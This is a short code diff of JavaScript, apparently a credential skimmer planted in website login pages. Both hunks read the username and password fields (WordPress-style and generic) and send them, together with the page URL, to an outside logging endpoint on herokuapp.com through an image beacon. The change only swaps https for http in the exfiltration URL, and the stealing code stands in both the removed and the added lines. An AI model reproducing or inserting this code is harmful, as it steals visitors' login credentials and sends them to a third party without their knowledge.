@@ -52,7 +52,7 @@
         username = document.getElementById("user_login").value;
         user_pass = document.getElementById("user_pass").value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
 
         }
       };
@@ -62,7 +62,7 @@
         username = document.getElementById("username").value;
         user_pass = document.getElementById("password").value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
         }
       };
     }
